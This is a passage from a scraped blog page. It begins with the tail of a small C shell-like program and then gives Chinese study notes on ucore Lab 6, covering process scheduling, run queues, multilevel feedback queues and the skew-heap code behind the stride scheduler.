name_list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key = name_list-&gt;key;</span><br><span class="line">    <span class="keyword">if</span> (key == ISDIR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_isfile</span><span class="params">(Command* name_list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key = name_list-&gt;key;</span><br><span class="line">    <span class="keyword">if</span> (key == ISFILE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_isrelocation</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* command_list)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (command_list[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span> &amp;&amp; command_list[<span class="number">1</span>] == <span class="string">&#x27;&gt;&#x27;</span> &amp;&amp; command_list[<span class="number">2</span>] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    start();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/28/Ucore-Lab6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/28/Ucore-Lab6/" class="post-title-link" itemprop="url">Ucore-Lab6</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-28 00:42:41 / Modified: 00:43:40" itemprop="dateCreated datePublished" datetime="2022-04-28T00:42:41+08:00">2022-04-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="CPU资源的时分复用"><a href="#CPU资源的时分复用" class="headerlink" title="CPU资源的时分复用"></a>CPU资源的时分复用</h2><p>进程切换：CPU资源的当前占用者切换</p>
<ul>
<li>保存当前进程在PCB中的执行上下文（CPU状态）</li>
<li>恢复下一个进程的执行上下文</li>
</ul>
<p>处理机调度：</p>
<ul>
<li>从就绪队列中<strong>挑选</strong>下一个占用CPU运行的进程</li>
<li>从多个可用CPU中<strong>挑选</strong>就绪进程可使用的CPU资源</li>
</ul>
<p>调度程序：挑选就绪进程的内核函数</p>
<ul>
<li>调度策略：依据什么原理挑选进程/线程</li>
<li>调度时机：什么时候进行调度</li>
</ul>
<p>内核运行调度程序的条件：</p>
<ul>
<li>进程从运行状态切换到等待状态</li>
<li>进程被终结了</li>
</ul>
<p>非抢占系统：</p>
<ul>
<li>当前进程主动放弃CPU时</li>
</ul>
<p>可抢占系统：</p>
<ul>
<li>中断请求被服务例程响应完成时</li>
<li>当前进程被抢占<ul>
<li>进程的时间片耗尽</li>
<li>进程从等待状态切换到就绪状态</li>
</ul>
</li>
</ul>
<h2 id="调度准则"><a href="#调度准则" class="headerlink" title="调度准则"></a>调度准则</h2><ul>
<li><p>比较调度算法的准则</p>
<ul>
<li>CPU使用率：CPU处于忙状态的<strong>时间百分比</strong></li>
<li>吞吐量：单位时间内完成的<strong>进程数量</strong></li>
<li>周转时间：进程从初始化到结束（包括等待）的<strong>总时间</strong></li>
<li>等待时间：进程在就绪队列中的<strong>总时间</strong></li>
<li>响应时间：从提交请求到产生响应所花费的<strong>总时间</strong></li>
</ul>
</li>
<li><p>调度策略的目标</p>
<ul>
<li><strong>减少响应时间</strong>：及时处理用户的输入，尽快将输出反馈给用户</li>
<li><strong>减少平均响应时间的波动</strong>：在交互系统中，可预测性比高差异低平均更重要</li>
</ul>
</li>
<li><p>调度策略的吞吐量目标</p>
<ul>
<li>增加吞吐量<ul>
<li>减小开销（例如上下文切换的开销）</li>
<li>系统资源的高效利用（例如CPU和IO设备的并行使用）</li>
</ul>
</li>
<li>减少每个进程的等待时间</li>
<li>保证吞吐量不受用户交互的影响</li>
</ul>
</li>
</ul>
<h2 id="时钟中断"><a href="#时钟中断" class="headerlink" title="时钟中断"></a>时钟中断</h2><ul>
<li>时钟中断是一种硬中断，由时间硬件（系统定时器，一种可编程硬件）产生，CPU处理后交由时间中断处理程序来完成更新系统时间、执行周期性任务等</li>
<li>系结构相关部分被注册到内核中，确保中断产生时能执行，这部分不能有耗时操作，主要是更新时间与调用结构无关部分列程（异步）</li>
<li>已到期的定时器由体系结构无关部分来处理，其它的一些耗时操作，如显示时间的更新也在这一部分</li>
</ul>
<p><strong>内核定时器</strong></p>
<ul>
<li>内核定时器产生的是软中断，软中断是进程相关的，它不会中断CPU的处理</li>
<li>使用定时器时，将软中断注册入内核</li>
<li>在每个时钟中断周期中，系统会检测到期到期定时器，触发软中断，判断时间到期，则执行定时器处理函数，最后清除掉定时器软中断</li>
</ul>
<p><strong>用户定时器</strong></p>
<ul>
<li>用户定时器是线程相关的，定时器产生的消息只会发送给注册线程</li>
<li>定时器消息属于最低优先级的消息，当线程的队列中没有其他消息时，才检索该消息</li>
</ul>
<h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><ul>
<li>在 SMP（对称多处理器）环境下，<strong>每个 CPU 对应一个 run_queue（可执行队列）</strong></li>
<li>如果一个进程处于 TASK_RUNNING 状态（可执行状态），则它会被加入到其中一个 run_queue（且同一时刻仅会被加入到一个 run_queue），以便让调度程序安排它在这个 run_queue 对应的 CPU 上面运行</li>
<li>一个CPU对应一个 run_queue 这样的设计，其好处是： <ul>
<li>一个持续处于 TASK_RUNNING 状态的进程总是趋于在同一个 CPU 上面运行（其间，这个进程可能被抢占、然后又被调度），这有利于进程的数据被 CPU 所缓存，提高运行效率</li>
<li>各个 CPU 上的调度程序只访问自己的 run_queue，避免了竞争</li>
</ul>
</li>
</ul>
<p>结构体 run_queue 用于描述队列：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run_queue</span> &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> run_list; <span class="comment">/* 其运行队列的链表结构,可以看作是队列结点(运行队列链表) */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> proc_num; <span class="comment">/* 表示其内部的进程总数 */</span></span><br><span class="line">    <span class="keyword">int</span> max_time_slice; <span class="comment">/* 每个进程一轮占用的最多时间片 */</span></span><br><span class="line">    <span class="keyword">skew_heap_entry_t</span> *lab6_run_pool; <span class="comment">/* 优先队列形式的进程容器(只在LAB6中使用) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>进程运行队列（就绪队列）：</p>
<ul>
<li>linux 提供了很多队列，但本实验只涉及到了运行队列（运行队列和就绪队列是同一个东西）</li>
<li>在 ucore 框架中，运行队列存储的是当前可以调度的进程，所以，只有状态为 runnable 的进程才能够进入运行队列，当前正在运行的进程并不会在运行队列中</li>
<li>运行队列通过链表的形式进行组织，链表的每一个节点是一个 list_entry_t，每个 list_entry_t 又对应到了 struct proc_struct *（和前面实验对于链表的操作如出一辙）</li>
</ul>
<h2 id="多级反馈队列"><a href="#多级反馈队列" class="headerlink" title="多级反馈队列"></a>多级反馈队列</h2><p><strong>RR时间片轮转原理</strong></p>
<ul>
<li>在采用时间片轮转算法中，所有的就绪进程按 FCFS 策略排成一个就绪队列</li>
<li>系统可设置每隔一定时间便产生一次中断，去激活进程调度程序进行调度，把CPU分配给队首进程，并令其执行一个时间片</li>
<li>当它运行完毕后，又把处理机分配给就绪队列中新的队首进程，也让它执行一个时间片</li>
<li>这样，就可以保证就绪队列中的所有进程在确定的时间段内，都能获得一个时间片的处理机时间</li>
</ul>
<p><strong>多级反馈队列调度机制</strong></p>
<ul>
<li>设置多个就绪队列，在系统中设置多个就绪队列，并为每个队列赋予不同的优先</li>
<li>第一个队列的优先级最高，第二个次之，其余队列的优先级逐个降低</li>
<li>该算法为不同列中的进程所赋予的执行时间片的大小也各不相同，在优先级愈高的队列中，其时间片愈小</li>
<li>每个队列都采用 FCFS 算法，当新进程进入内存后，首先将它放入第一队列的末尾，按 FCFS 原则等待调度<ul>
<li>当轮到该进程执行时，如它能在该时间片内完成，便可撤离系统</li>
<li>否则，即它在一个时间片结束时尚未完成，调度程序将其转入第二队列的末尾等待调度</li>
<li>如果它在第二队列中运行个时间片后仍未完成， 再依次将它放入第三队列 … 依此类推</li>
</ul>
</li>
<li>当进程最后被降到第n队列后，在第n队列中便采取按RR方式运行</li>
<li>PS：这里只讨论了最简单的情况，中途没有进程进行“抢占”</li>
</ul>
<h2 id="斜堆-Skew-Heap"><a href="#斜堆-Skew-Heap" class="headerlink" title="斜堆(Skew Heap)"></a>斜堆(Skew Heap)</h2><p>斜堆(Skew heap)也叫自适应堆(self-adjusting heap)，它是左倾堆的一个变种，和左倾堆一样，它通常也用于实现优先队列，它的合并操作的时间复杂度也是 O(lg n) </p>
<p>相比于左倾堆，斜堆的节点没有”零距离”这个属性，除此之外，它们斜堆的合并操作也不同</p>
<p>斜堆的合并操作算法如下： </p>
<ul>
<li>第1步：如果一个空斜堆与一个非空斜堆合并，返回非空斜堆</li>
<li>第2步：如果两个斜堆都非空，那么比较两个根节点，取较小堆的根节点为新的根节点，将 “较小堆的根节点的右孩子” 和 “较大堆” 进行合并</li>
<li>第3步：合并后，交换新堆根节点的左孩子和右孩子</li>
</ul>
<p>第3步是斜堆和左倾堆的合并操作差别的关键所在：</p>
<ul>
<li>如果是左倾堆，则合并后要比较左右孩子的零距离大小</li>
<li>若右孩子的零距离 &gt; 左孩子的零距离，则交换左右孩子</li>
<li>最后设置根的零距离</li>
</ul>
<p><strong>ucore 中和斜堆有关的结构</strong></p>
<ul>
<li>skew_heap_entry：用于记录斜堆各个节点的信息</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skew_heap_entry</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">skew_heap_entry</span> *<span class="title">parent</span>, *<span class="title">left</span>, *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>compare_f：一个函数指针，指向 <code>proc_stride_comp_f</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(*compare_f)</span><span class="params">(<span class="keyword">void</span> *a, <span class="keyword">void</span> *b)</span></span>;</span><br></pre></td></tr></table></figure>
<p><strong>ucore 中和斜堆有关的函数</strong></p>
<ul>
<li>proc_stride_comp_f：优先队列的比较函数， <strong>用于测优先级</strong> ，主要思路就是通过步数相减，然后根据其正负比较大小关系（具体的数学原理我真的搞不明白，反正这个函数可以用来测优先级就对了）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">proc_stride_comp_f</span><span class="params">(<span class="keyword">void</span> *a, <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">p</span> =</span> le2proc(a, lab6_run_pool); <span class="comment">// 获取进程a</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">q</span> =</span> le2proc(b, lab6_run_pool); <span class="comment">// 获取进程b</span></span><br><span class="line">     <span class="keyword">int32_t</span> c = p-&gt;lab6_stride - q-&gt;lab6_stride; <span class="comment">// 步数相减,通过正负比较大小关系</span></span><br><span class="line">     <span class="keyword">if</span> (c &gt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">/* b的优先级高(stride更小) */</span></span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">/* a的优先级高(stride更小) */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>skew_heap_init：初始化斜堆</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">skew_heap_init</span><span class="params">(<span class="keyword">skew_heap_entry_t</span> *a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     a-&gt;left = a-&gt;right = a-&gt;parent = <span class="literal">NULL</span>; <span class="comment">/* 置空斜堆的3个索引点 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>skew_heap_insert：将新的进程插入到表示就绪队列的斜堆中，该函数的返回结果是斜堆的新的根</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">skew_heap_entry_t</span> *</span></span><br><span class="line"><span class="function"><span class="title">skew_heap_insert</span><span class="params">(<span class="keyword">skew_heap_entry_t</span> *a, <span class="keyword">skew_heap_entry_t</span> *b,</span></span></span><br><span class="line"><span class="params"><span class="function">                 compare_f comp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     skew_heap_init(b); <span class="comment">/* 置空斜堆b */</span></span><br><span class="line">     <span class="keyword">return</span> skew_heap_merge(a, b, comp); <span class="comment">/* 合并这两个斜堆,并返回得到的新堆 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>skew_heap_remove：删除斜堆中的指定进程</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">skew_heap_entry_t</span> *</span></span><br><span class="line"><span class="function"><span class="title">skew_heap_remove</span><span class="params">(<span class="keyword">skew_heap_entry_t</span> *a, <span class="keyword">skew_heap_entry_t</span> *b,</span></span></span><br><span class="line"><span class="params"><span class="function">                 compare_f comp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">skew_heap_entry_t</span> *p   = b-&gt;parent;</span><br><span class="line">     <span class="keyword">skew_heap_entry_t</span> *rep = skew_heap_merge(b-&gt;left, b-&gt;right, comp); <span class="comment">/* 合并这两个斜堆,并返回得到的新堆 */</span></span><br><span class="line">     <span class="keyword">if</span> (rep) rep-&gt;parent = p;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">if</span> (p)</span><br><span class="line">     &#123;</span><br><span class="line">          <span class="keyword">if</span> (p-&gt;left == b)</span><br><span class="line">               p-&gt;left = rep;</span><br><span class="line">          <span class="keyword">else</span> p-&gt;right = rep;</span><br><span class="line">          <span class="keyword">return</span> a;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">return</span> rep;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>skew_heap_merge：合并这两个斜堆，并返回得到的新堆（没学对应的数据结构，看不懂）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">skew_heap_entry_t</span> *</span></span><br><span class="line"><span class="function"><span class="title">skew_heap_merge</span><span class="params">(<span class="keyword">skew_heap_entry_t</span> *a, <span class="keyword">skew_heap_entry_t</span> *b,</span></span></span><br><span class="line"><span class="params"><span class="function">                compare_f comp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (a == <span class="literal">NULL</span>) <span class="keyword">return</span> b;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="literal">NULL</span>) <span class="keyword">return</span> a;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">skew_heap_entry_t</span> *l, *r;</span><br><span class="line">     <span class="keyword">if</span> (comp(a, b) == <span class="number">-1</span>) <span class="comment">/* 执行proc_stride_comp_f: a的优先级更高 */</span></span><br><span class="line">     &#123;</span><br><span class="line">          r = a-&gt;left;</span><br><span class="line">          l = skew_heap_merge(a-&gt;right, b, comp);</span><br><span class="line">          </span><br><span class="line">          a-&gt;left = l;</span><br><span class="line">          a-&gt;right = r;</span><br><span class="line">          <span class="keyword">if</span> (l) l-&gt;parent = a;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> a;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span> <span class="comment">/* 执行proc_stride_comp_f: b的优先级更高 */</span></span><br><span class="line">     &#123;</span><br><span class="line">          r = b-&gt;left;</span><br><span class="line">          l = skew_heap_merge(a, b-&gt;right, comp);</span><br><span class="line">          </span><br><span class="line">          b-&gt;left = l;</span><br><span class="line">          b-&gt;right = r;</span><br><span class="line">          <span class="keyword">if</span> (l) l-&gt;parent = b;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> b;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>规律总结：</p>
<ul>
<li>stride 值最小的进程在斜堆的最顶端（优先度更高）</li>
</ul>
<h2 id="练习0-把-lab5-的内容复制粘贴到-lab6"><a href="#练习0-把-lab5-的内容复制粘贴到-lab6" class="headerlink" title="练习0-把 lab5 的内容复制粘贴到 lab6"></a>练习0-把 lab5 的内容复制粘贴到 lab6</h2><p>lab6 的代码有一些不同的地方</p>
<p>在 proc_struct 添加有关 <strong>时钟中断</strong> 的部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">proc_state</span> <span class="title">state</span>;</span>      <span class="comment">// 当前进程的状态</span></span><br><span class="line">    <span class="keyword">int</span> pid;                    <span class="comment">// 进程ID</span></span><br><span class="line">    <span class="keyword">int</span> runs;                   <span class="comment">// 当前进程被调度的次数</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> kstack;           <span class="comment">// 内核栈</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">bool</span> need_resched; <span class="comment">// 是否需要被调度</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">parent</span>;</span> <span class="comment">// 父进程ID</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>       <span class="comment">// 当前进程所管理的虚拟内存页，包括其所属的页目录项PDT</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>     <span class="comment">// 保存的进程上下文,用于进程切换</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span>;</span>       <span class="comment">// 中断帧指针,指向内核栈的某个位置(保存有中断上下文)</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> cr3;                  <span class="comment">// 页目录表的地址</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;                 <span class="comment">// 当前进程的相关标志</span></span><br><span class="line">    <span class="keyword">char</span> name[PROC_NAME_LEN + <span class="number">1</span>];   <span class="comment">// 进程名称(可执行文件名)</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link;         <span class="comment">// 进程链表 </span></span><br><span class="line">    <span class="keyword">list_entry_t</span> hash_link;         <span class="comment">// 进程哈希表 </span></span><br><span class="line">    <span class="keyword">int</span> exit_code;    				 <span class="comment">/* lab5新增:描述线程退出时的原因 */</span> </span><br><span class="line">    <span class="keyword">uint32_t</span> wait_state;			 <span class="comment">/* lab5新增:描述线程进入wait阻塞态的原因 */</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">cptr</span>, *<span class="title">yptr</span>, *<span class="title">optr</span>;</span>    <span class="comment">/* lab5新增:用于组织子进程链表 */</span> </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;-- 以下都是lab6新增的部分 --&gt; */</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>;</span>                       <span class="comment">// 指向运行队列(就绪队列)</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> run_link;                      <span class="comment">// 在运行队列中链接的条目</span></span><br><span class="line">    <span class="keyword">int</span> time_slice;                             <span class="comment">// 占用CPU的时间片</span></span><br><span class="line">    <span class="keyword">skew_heap_entry_t</span> lab6_run_pool;            <span class="comment">// 仅适用于LAB6:运行池中的条目</span></span><br><span class="line">    <span class="keyword">uint32_t</span> lab6_stride;                       <span class="comment">// 仅适用于LAB6:流程的当前步幅</span></span><br><span class="line">    <span class="keyword">uint32_t</span> lab6_priority;                     <span class="comment">// 仅适用于LAB6:进程的优先级(由LAB6_set_priority设置)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>对应的 alloc_proc 函数（创建进程控制结构）也要发生变化：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> =</span> kmalloc(<span class="keyword">sizeof</span>(struct proc_struct));</span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        proc-&gt;state = PROC_UNINIT;</span><br><span class="line">        proc-&gt;pid = <span class="number">-1</span>;</span><br><span class="line">        proc-&gt;runs = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;kstack = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;(proc-&gt;context), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct context));</span><br><span class="line">        proc-&gt;tf = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;cr3 = boot_cr3;</span><br><span class="line">        proc-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(proc-&gt;name, <span class="number">0</span>, PROC_NAME_LEN);</span><br><span class="line">        proc-&gt;wait_state = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;cptr = proc-&gt;optr = proc-&gt;yptr = <span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* &lt;-- 以下都是lab6新增的部分 --&gt; */</span></span><br><span class="line">        </span><br><span class="line">        proc-&gt;rq = <span class="literal">NULL</span>; <span class="comment">/* 把运行队列置空 */</span></span><br><span class="line">        list_init(&amp;(proc-&gt;run_link)); <span class="comment">/* 初始化运行队列中链接的条目 */</span></span><br><span class="line">        proc-&gt;time_slice = <span class="number">0</span>; <span class="comment">/* 初始化占用CPU的时间片 */</span></span><br><span class="line">        proc-&gt;lab6_run_pool.left = proc-&gt;lab6_run_pool.right = proc-&gt;lab6_run_pool.parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;lab6_stride = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;lab6_priority = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外在 trap_dispatch 函数中填入 “中断请求-计时器中断” 对应的部分：</p>
<ul>
<li>在 lab6 中，时钟中断的处理逻辑中主动调用了调度器的 proc_tick 函数，使得调度器能感知到时钟中断的产生，并调整调度相关的数据结构</li>
</ul>
